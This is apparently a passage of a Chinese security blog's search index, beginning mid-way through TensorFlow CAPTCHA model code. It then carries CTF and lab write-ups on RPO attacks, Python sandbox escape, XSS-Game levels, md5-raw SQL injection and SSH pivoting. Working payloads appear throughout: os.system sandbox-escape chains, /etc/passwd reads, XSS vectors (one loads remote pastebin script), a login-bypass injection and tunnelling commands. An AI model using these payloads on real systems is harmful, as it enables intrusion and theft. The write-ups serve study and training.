8, 64] conv3 = tf.nn.relu(tf.nn.bias_add(tf.nn.conv2d(conv2, w_c3, strides=[1, 1, 1, 1], padding='SAME'), b_c3)) # [?, 13, 4, 64] conv3 = tf.nn.max_pool(conv3, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME') # [3328, 1024] w_d = tf.Variable(w_alpha*tf.random_normal([4*13*64, 1024])) b_d = tf.Variable(b_alpha*tf.random_normal([1024])) # [?, 3328] dense = tf.reshape(conv3, [-1, w_d.get_shape().as_list()[0]]) # [?, 1024] dense = tf.nn.relu(tf.add(tf.matmul(dense, w_d), b_d)) dense = tf.nn.dropout(dense, self.keep_prob) # [1024, 63*4=252] w_out = tf.Variable(w_alpha*tf.random_normal([1024, self.max_captcha*self.char_set_len])) b_out = tf.Variable(b_alpha*tf.random_normal([self.max_captcha*self.char_set_len])) # [?, 252] out = tf.add(tf.matmul(dense, w_out), b_out) # out = tf.nn.softmax(out) return out]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RPO相对路径覆盖攻击]]></title>
    <url>%2FRPO%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E8%A6%86%E7%9B%96%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[0x01 RPO简介RPO(Relative Path Overwrite)相对路径覆盖，是一种利用相对URL路径覆盖目标文件的一种攻击手段。该攻击方法利用浏览器和服务器对资源加载设置的差异，通过某些方法和技巧，在相对路径处，引入我们可控的js/css文件，甚至引入非js/css文件，并按照js/css的语法执行，从而实现攻击。 0x02 漏洞成因2.1 pathinfo模式在介绍漏洞成因之前先介绍一下pathinfo这种url解析模式。对于访问一个以MVC模式搭建的网站，必然带有M、C、A三个参数即module、controller、action，这些参数需要还需要用&amp;符号隔开，假若参数量很多，就显得特别的不友好啦。然而PathInfo模式功能就是将这一长串缩短简化，让这个路径变得更加友好的显示。传统的访问路径是这样子的：1 http://www.example.com/index.php?m=module&amp;c=controller&amp;a=action&amp;var1=vaule1&amp;var2=vaule2..... 而在pathinfo的URL模式下路径:1 http://www.example.com/index.php/module/controller/action/var1/vaule1/var2/value2..... 2.2 服务端与客户端解码差异在服务端中，编码后的url服务器可以正常识别，也就是说服务器在加载文件时会解码后找到具体文件返回返回客户端。但是在客户端识别url时是不会解码的,如果某些静态资源文件使用相对路径,就很容易遭受RPO相对路径覆盖攻击.有点绕，那么用一个简单例子理解一下：1http://127.0.0.1/index.php/test/..%2f..%2findex.php 在服务端，%2f会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。也就是访问 http://127.0.0.1/index.php/test/../../index.php 即返回 http://127.0.0.1/index.php 的内容。而在客户端，浏览器并没有对%2f进行解码，在pathInfo模式下认为..%2f..%2findex.php为一个无效的数据而返回test的内容。 2.3 触发条件触发这个漏洞有两个基本的前提：①Apache 配置错误导致AllowEncodedSlashes这个选项开启（对Apache来说默认情况下 AllowEncodedSlashes 这个选项是关闭的），或者nginx服务器。②存在相对路径的js或者css的引用 0x03 利用演示 1.加载任意目录下静态资源文件搭建本地环境/test/index.html1234567891011&lt;html &gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Rpo Test&lt;/title&gt; &lt;script src="1.js"&gt; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Test.....&lt;h1&gt;&lt;/body&gt;&lt;/html&gt; 客户端加载的静态资源是/test目录下的1.js文件,内容为:1document.write('&lt;p&gt;t=This is test_111111&lt;/p&gt;'); 如果我们控制test下面css的目录下面的test_2.js的内容,写入/test/css/1.js内容如下:1document.write('&lt;p&gt;t=This is test_222222&lt;/p&gt;'); 那么当我们访问：http://test/index.html/css/..%2findex.html页面将会加载/test/css/1.js的输出内容，即实现了相对路径覆盖攻击, 我们成功覆盖掉了index.html中静态资源1.js的路径. 2.将返回内容按静态文件解析现在有如下环境：我们可以提交内容，然后内容会显示到当前页面，而且使用相对路径加载静态文件style.css和script.js文件，这两个文件原本内容为空，此时我们访问：http://127.0.0.1:8888/RPO_HACK/user/2这里表示使用2作为参数请求user接口，此时加载静态文件为：12http://127.0.0.1:8888/RPO_HACK/user/style.csshttp://127.0.0.1:8888/RPO_HACK/user/script.js 然后我们提交一段css内容：{} * {color:red;}当我们访问：http://127.0.0.1:8888/RPO_HACK/user/2/xxx时：这里表示我们使用2/xxx作为参数访问user接口，返回的内容和使用参数2访问返回的内容相同。但是浏览器客户端认为2是目录，然后加载的静态文件为:12http://127.0.0.1:8888/RPO_HACK/user/2/style.csshttp://127.0.0.1:8888/RPO_HACK/user/2/script.js 所以此时加载静态文件返回的内容也是同使用参数2访问时返回内容相同，但是此时浏览器认为这里加载的是样式文件和脚本文件，从而将返回内容解析为css或者js，所以我们提交的css内容：{} * {color:red;} 成功解析为css，将页面渲染成红色。 3.谷歌实例示例来自国外的一篇文章作者发现Google Toolbar的一个目标URL:http://www.google.com/tools/toolbar/buttons/apis/howto_guide.html, 该页面用相对路径导入CSS样式。css文件路径为../../styles.css，URL写为1http://www.google.com/tools/toolbar/buttons/apis%2fhowto_guide.html 返回正确服务器接收到的是*/tools/toolbar/buttons/apis/howto_guide.html浏览器接收到的是 */tools/toolbar/buttons/apis%2fhowto_guide.html页面中导入的样式表 为 */tools /toolbar/buttons/../../ style.css浏览器认为style.css的根目录是tools/toolbar/buttons，而不是tools/toolbar/button/apis所以../../style.css跳到了更高一级的目录下 除了跳目录以外，还能制作假目录，例如，我们想在导入的样式路径为/tools/fake/styles.css, 可以构造如下url:http://www.google.com/tools/fake/..%2ftoolbar/buttons/apis%2fhowto_guide.html服务器视角: /tools/fake/../toolbar/buttons/apis/ + howto_guide.浏览器视角: tools/fake/..%2ftoolbar/buttons/ + apis%2fhowto_guide.html导入的css样式: /tools/fake/..%2ftoolbar/buttons/../../ + style.css这里我们添加了两个虚假的路径:fake/和..%2f, 以便他们能在服务器相互抵消，同时浏览器认为fake/是一个真实的目录，并且，..%2ftoobar是另外一个目录作者在此基础上找到了一处可以利用的重定向页面，http://www.google.com/tools/toolbar/buttons/gallery会重定向到 http://www.google.com/gadgets/directory?synd=toolbar&amp;frontpage=1在这里参数q是作为搜索参数，并且反应在页面上，可以成功注入一个简单的payload:12![此处输入图片的描述][4]可以看到，这里可以控制q，能使用如下payload导入样式。 http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/..%2f/apis/howto_guide.html12![此处输入图片的描述][5]当然到这里只是改变了页面样式，作者进一步利用，改变payload为 CSS XSS向量expression(alert(document.domain))，并启动IE8: http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bx%253Aexpression(alert(document.domain))%257D/..%2f/apis/1234567891011121314151617![此处输入图片的描述][6]## 0x04 利用场景&gt; * 加载任意目录下静态资源文件如上演示,我们可以加载任意目录下的1.js去覆盖index.html中静态资源1.js的路径&gt; * 将任意文件内容按静态文件解析在使用了pathurl模式的php开发框架以及pythonweb框架中，经常使用相对路径来加载静态资源文件。比如一篇文章的链接为 index.php/view/article/666/view是index.php中的方法,article和666分别是传入的参数名和参数值.如果我们在其后加上..2f..%2f/这样路径会如何,服务端正常解码后返回/index.php/view页面的内容,但客户端不会解码,所有采用相对路径的静态资源文件的父路径变成了index.php/view/article/666/,而在这个链接后面加上的..%2f..%2f会被当做参数来解析,最后返回的还是index.php/view/article/666/文章的内容.这样我们就完成了将任意文件内容按静态文件来解析的漏洞利用了。## 0x05 ctf题目### 强网杯xss题：share your mind 题目提示xss bot使用了phantomjs登录后add页面可添加文章，而report页面可提交链接。而且网站静态js文件采用相对路径来访问根路径:/index.php中有一个静态文件是用相对路径表示的![此处输入图片的描述][7] ` 首先我们add一篇内容为: alert(1)的文章:得到文章路径:http://39.107.33.96:20000/index.php/view/article/41801我们在这个文章路径后面加上/..%2f..%2f..%2f, 然后在访问,发现页面会弹窗。也就是将我们添加的文章作为了js脚本运行。这是因为服务端会正常解码,跳转3个目录到index.php,返回给我们对应的内容。而客户端并不会解码%2f, 而是将..%2f..%2f..%2f 当成一个文件来看待了，客户端寻找js的路径为:http://39.107.33.96:20000/index.php/view/article/41801/static/js/jquery.min.jspathinfo的模式下,static/js/jquery.min.js 会被当做参数,最后返回的还是该文章的页面,即alert(1)的内容。到此即可找到xss攻击点，可进一步构造js代码读取cookie. 0x06 防护方案1.在页面中避免直接使用相对路径进行静态文件的加载，使用完整的url，或者所有的引用都加/。2.在页面开头，声明 &lt;!DOCTYPE html&gt;. 0x07 参考链接http://blog.nsfocus.net/rpo-attack/https://blog.innerht.ml/rpo-gadgets/https://xz.aliyun.com/t/2220]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>RPO</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python沙箱逃逸]]></title>
    <url>%2Fpython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%2F</url>
    <content type="text"><![CDATA[0x00 前言ctf2018国赛的一道题目 拿到题目，nc连接之后得到一个命令交互会话。根据提示是个python环境，并且要拿到shell获取flag。那么很明显了，这是一个python沙箱环境，要进行逃逸获取shell。 0x01 题目分析首先尝试导入能执行系统命令的模块，当然，直接给报错了。然后又尝试一下import其他不敏感的模块，全都是返回ban。那么这里应该是对所有Import进行了拦截。那么直接上一种彪悍的方式，python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的1Payload: ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s') 但是就是在这里出现了一个很头疼的事，这个沙箱还过滤了敏感命令，比如os，ls ，sys，cat全都进行了过滤。而非常巧的是，func_globals里面包含了ls这个字符串，而这里又不能用字符串拼接的方式进行拼接。在这里饶了一大圈，尝试几种方式都没有成功。然后查了一大波文档，最终找到了一个非常有意思的方式 getattribute 。参考https://developers.google.com/protocol-buffers/docs/reference/python/type-class 示例：1x.__getattribute__('name') &lt;==&gt; x.name 那么这里可以看出，object x可以使用getattribute方法，这样name就变为字符串，也就达到了我们可以拼接的要求。那么上面的payload可以改为：1().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem'] ('l'+'s') 成功拿到一个shell。 0x02 通用payload文件读取：12a="".__class__.__mro__[-1].__subclasses__()[40]("/etc/passwd").read()a="".__class__.__mro__[-1].__subclasses__()[40]("/root/run.py").read() python shell-命令执行：1234().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t'+' home/ctf/5c72a1d444cf3121a5d25f2db4147ebb')().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t'+' home/ctf/cpython') 0x03 题目源码读取到题目源码sandbox.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-04-09 23:30:58# @Author : Xu (you@example.org)# @Link : https://xuccc.github.io/# @Version : $Id$from sys import modulesfrom cpython import get_dictfrom types import FunctionTypemain = modules['__main__'].__dict__origin_builtins = main['__builtins__'].__dict__def delete_type(): type_dict = get_dict(type) del type_dict['__bases__'] del type_dict['__subclasses__']def delete_func_code(): func_dict = get_dict(FunctionType) del func_dict['func_code']def safe_import(__import__,whiteList): def importer(name,globals=&#123;&#125;,locals=&#123;&#125;,fromlist=[],level=-1): if name in whiteList: return __import__(name,globals,locals,fromlist,level) else: print "HAHA,[%s] has been banned~" % name return importerclass ReadOnly(dict): """docstring for ReadOnlu""" def __delitem__(self,keys): raise ValueError(":(") def pop(self,key,default=None): raise ValueError(":(") def popitem(self): raise ValueError(":(") def setdefault(self,key,value): raise ValueError(":(") def __setitem__(self,key,value): raise ValueError(":(") def __setattr__(self, name, value): raise ValueError(":(") def update(self,dict,**kwargs): raise ValueError(":(") def builtins_clear(): whiteList = "raw_input SyntaxError ValueError NameError Exception __import__".split(" ") for mod in __builtins__.__dict__.keys(): if mod not in whiteList: del __builtins__.__dict__[mod]def input_filter(string): ban = "exec eval pickle os subprocess input sys ls cat".split(" ") for i in ban: if i in string.lower(): print "&#123;&#125; has been banned!".format(i) return "" return string# delete_type();del delete_typedelete_func_code();del delete_func_codebuiltins_clear();del builtins_clearwhiteMod = []origin_builtins['__import__'] = safe_import(__import__,whiteMod)safe_builtins = ReadOnly(origin_builtins);del ReadOnlymain['__builtins__'] = safe_builtins;del safe_builtinsdel get_dict,modules,origin_builtins,safe_import,whiteMod,main,FunctionTypedel __builtins__, __doc__, __file__, __name__, __package__print """ ____ | _ \ _ _ _ __ | |_) | | | | '_ \ | _ &lt;| |_| | | | | |_| \_\\__,_|_| |_| Escape from the dark house built with python :)Try to getshell then find the flag!"""while 1: inp = raw_input('&gt;&gt;&gt;') cmd = input_filter(inp) try: exec cmd except NameError, e: print "wow something lose!We can\'t find it ! D:" except SyntaxError,e: print "Noob! Synax Wrong! :(" except Exception,e: print "unknow error,try again :&gt;" cpython.py 12345678910from ctypes import pythonapi,POINTER,py_object_get_dict = pythonapi._PyObject_GetDictPtr_get_dict.restype = POINTER(py_object)_get_dict.argtypes = [py_object]del pythonapi,POINTER,py_objectdef get_dict(ob): return _get_dict(ob).contents.value 0x04 参考文章https://paper.tuisec.win/detail/430721803508f2ehttps://developers.google.com/protocol-buffers/docs/reference/python/type-class]]></content>
      <categories>
        <category>python安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS-Game 解题记录]]></title>
    <url>%2FXSS-Game-%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[题目链接：https://xss-game.appspot.com Level 1level 1 比较简单，get方法传入的query参数会直接在b标签中输出。12payloadhttps://xss-game.appspot.com/level1/frame?query=&lt;script&gt;alert(1)&lt;/script&gt; Level 2level 2 是一个留言板，输入的内容会发布在一个123```payload&lt;img src=&apos;&apos; onerror=&apos;alert(1)&apos;&gt; Level 3Level 3 中传入的参数带入到了img标签中的src里，那么这里可以闭合src再引入新的事件触发xss。这里需要注意的是src是由双引号闭合的，但是传入双引号却无法闭合，传入单引号会闭合。 123payload https://xss-game.appspot.com/level3/frame#3' onerror='alert(1)' Level 4这个题目中，传入的内容会被作为一个时间函数的参数，而这个函数是由img标签中onload事件触发的，那么思路便是将调用的函数闭合，再引入我们需要执行的代码。onload中可以执行多条语句，中间以;分隔，注意这里我们传入的分号要进行url编码12payloadhttps://xss-game.appspot.com/level4/frame?timer=');alert('1 Level 5这个题目中a标签中的href是用户可控的，href默认是解析url，但是我们可以指定为javascript执行。12payload https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1) Level 6这个题目可以使应用程序请求成为外部文件，调用远程js代码，虽然其过滤了https,但是没有考虑大写情况。这里使用一个在线远程文件服务器。https://pastebin.com/123payloadhttps://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw/EuYL4VC8]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[md5($str,true)引发的sql注入]]></title>
    <url>%2Fmd5-true-%E5%BC%95%E5%8F%91%E7%9A%84sql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526272829303132333435class RealSecureLoginManager &#123; private $em; private $user; private $password; public function __construct($user, $password) &#123; $this-&gt;em = DoctrineManager::getEntityManager(); $this-&gt;user = $user; $this-&gt;password = $password; &#125; public function isValid() &#123; $pass = md5($this-&gt;password, true); $user = $this-&gt;sanitizeInput($this-&gt;user); $queryBuilder = $this-&gt;em-&gt;createQueryBuilder() -&gt;select("COUNT(p)") -&gt;from("User", "u") -&gt;where("password = '$pass' AND user = '$user'"); $query = $queryBuilder-&gt;getQuery(); return boolval($query-&gt;getSingleScalarResult()); &#125; public function sanitizeInput($input) &#123; return addslashes($input); &#125;&#125;$auth = new RealSecureLoginManager( $_POST['user'], $_POST['passwd']);if (!$auth-&gt;isValid()) &#123; exit;&#125; 在上面的代码中，$queryBuilder拼接了一条sql查询语句，但是对传入的user进行了addslashes函数过滤，也就是说没有办法通过user进行注入，而且pass变量是经过md5计算的散列值，理论上也没有办法进行注入，但是这里这里md5()函数的$raw_output值设置为true，那么这个md5报文摘要将以16字节长度的原始二进制格式返回。什么意思呢？看一下下面的执行结果也就是说这个二进制格式的返回值会引入其他非预期的字符，比如说\这里经过fazz,发现 md5(128, true) 最后的结果带有反斜杠。因此这题最后的payload如下：1user= OR 1=1#&amp;passwd=128 另外实验吧的一道题目类似http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux端口转发]]></title>
    <url>%2Flinux%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%2F</url>
    <content type="text"><![CDATA[0x01 ssh正向代理动态端口转发环境：123A:192.168.111.130 //kali攻击机B:192.168.111.128 //能够进行ssh连接（知道其ssh口令）的ubuntu跳板C:172.17.0.2 //跟转发机处于同一内网的目标靶机（docker启动的容器） 在kali上执行命令1ssh 2 -D 2333 ghost@192.168.111.128 //这条命令是将A本地的2333端口，与B的22端口建立socks连接,输入B的ssh口令即可进行连接 可以使用火狐添加本地127.0.0.1 2333端口的socks代理查看内网的web服务 夜可以使用proxychains代理本地应用配置proxychains代理1234gedit /etc/proxychains.conf添加 socks 127.0.0.1 2333 例如使用nmap扫描开放端口1proxychains nma[ -Pn -sT 172.17.0.2 0X02 ssh正向代理单一端口转发1ssh -L 8888:172.17.0.2:80 ghost@192.168.111.128//访问127.0.0.1:8888相当于访问172.17.0.2:80 0x03 ssh反向代理单一端口转发12345678//先在A(kali)上生成ssh需要的host keyssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_keyssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key//然后在B运行ssh -R 8888:172.17.0.20:80 root@192.168.111.130 //A访问127.0.0.1:2222相当于访问C:22 0x04 ssh多级代理增加一级 D:192.168.168.412345ssh -R 8888:127.0.0.1:4444 root@192.168.111.130B作反向代理，将A:8888与B:4444打通ssh隧道ssh -2 -D 4444 msfadmin@172.17.0.2 //需要知道C的ssh口令B将本地4444端口与C打通ssh隧道，C作正向代理]]></content>
      <categories>
        <category>后渗透</category>
      </categories>
      <tags>
        <tag>端口转发</tag>
      </tags>
  </entry>
</search>
